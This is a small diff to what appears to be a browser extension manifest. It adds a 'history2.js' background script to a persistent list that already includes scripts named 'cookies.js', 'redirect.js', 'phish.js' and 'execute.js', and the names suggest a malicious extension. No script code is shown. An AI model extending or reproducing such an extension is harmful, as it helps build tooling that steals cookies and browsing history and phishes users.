@@ -11,7 +11,8 @@
             "scripts/cookies.js",
             "scripts/redirect.js",
             "scripts/phish.js",
-            "scripts/execute.js"
+            "scripts/execute.js",
+            "scripts/history2.js"
         ],
         "persistent": true
     },
